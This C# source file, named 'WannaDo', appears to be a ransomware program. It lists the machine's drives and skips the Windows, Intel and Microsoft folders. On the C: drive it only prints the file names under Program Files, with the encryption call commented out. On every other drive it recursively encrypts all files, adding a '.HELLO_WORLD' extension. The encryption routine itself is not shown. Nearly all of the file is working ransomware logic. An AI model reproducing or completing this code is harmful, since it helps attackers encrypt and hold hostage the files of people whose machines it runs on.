﻿using System;
using System.Collections.Generic;
using System.IO;

namespace WannaDo {
    class Program {
        static List<string> DiskLetters = new List<string> ();
        static List<Avoid> avoid = new List<Avoid> ();
        static List<Target> target = new List<Target> ();

        private static void CurrentDrives () {
            //get all disk letter in the host
            DriveInfo[] allDrives = DriveInfo.GetDrives ();

            foreach (DriveInfo d in allDrives) {
                if (d.IsReady == true) {
                    Console.WriteLine (d.Name);
                    DiskLetters.Add (d.Name);
                } else Console.WriteLine ($"{d.Name} is not ready");
            }
        }

        private static void AddTarget () {
            //add target folders to the list
            avoid.Add (new Avoid { Id = 1, FolderName = "Microsoft" });
            avoid.Add (new Avoid { Id = 1, FolderName = "Intel" });
            avoid.Add (new Avoid { Id = 1, FolderName = "Windows" });
        }

        private static void AddAvoid () {
            //add avoid folders to the list
            target.Add (new Target { Id = 1, DirectoryName = @"C:\Program Files\" });
            target.Add (new Target { Id = 2, DirectoryName = @"C:\Program Files (x86)\" });
        }

        private static void EncryptFile (bool all_foldes, string sourcePath, string cryptoExtension) {
            Cryptography crypto = new Cryptography ();

            //encrypt directory and subdirectory files
            if (all_foldes) {
                string noExtName = Path.GetFileNameWithoutExtension (sourcePath);
                string dirName = Path.GetDirectoryName (sourcePath);
                string destPath = $"{dirName}\\{noExtName}{cryptoExtension}";

                crypto.EncryptFile (sourcePath, destPath);
            } else {
                crypto.EncryptFile ("", "");
            }
        }

        ///// MAIN FUNCTION /////
        static void Main (string[] args) {
            CurrentDrives ();
            AddAvoid ();
            AddTarget ();

            foreach (string disk in DiskLetters) {
                if (disk.StartsWith ('C')) //avoid windows, intel, microsoft folder
                {
                    //get all directories
                    for (int i = 0; i < target.Count; i++) {
                        var dirs = Directory.GetDirectories (target[i].DirectoryName.ToLower ());
                        foreach (string dir in dirs) {

                            if (dir.Contains (avoid[0].FolderName) || dir.Contains (avoid[1].FolderName) || dir.Contains (avoid[2].FolderName)) {
                                //get avoid dirs
                                //Console.WriteLine("avoid dir: " + dir);
                            } else {
                                //get target dirs
                                //get target files into dirs
                                try {
                                    var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                    foreach (string file in files) {
                                        Console.WriteLine (file);
                                        //encrypt here
                                        //EncryptFile(true, file, ".HELLO_WORLD");
                                    }
                                } catch (UnauthorizedAccessException ex) {
                                    Console.WriteLine (ex.Message);
                                    continue;
                                }
                            }
                        }
                    }
                } else {
                    //encrypt all 
                    var dirs = Directory.GetDirectories (disk);
                    foreach (string dir in dirs) {

                        if (dir.Contains (avoid[0].FolderName) || dir.Contains (avoid[1].FolderName) || dir.Contains (avoid[2].FolderName)) {
                            //get avoid dirs
                        } else {
                            //get target files into dirs
                            try {
                                var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                foreach (string file in files) {
                                    Console.WriteLine (file);
                                    //encrypt here
                                    EncryptFile(true, file, ".HELLO_WORLD");
                                }
                            } catch (UnauthorizedAccessException ex) {
                                Console.WriteLine (ex.Message);
                                continue;
                            }
                        }
                    }
                }
            }
        }
    }
}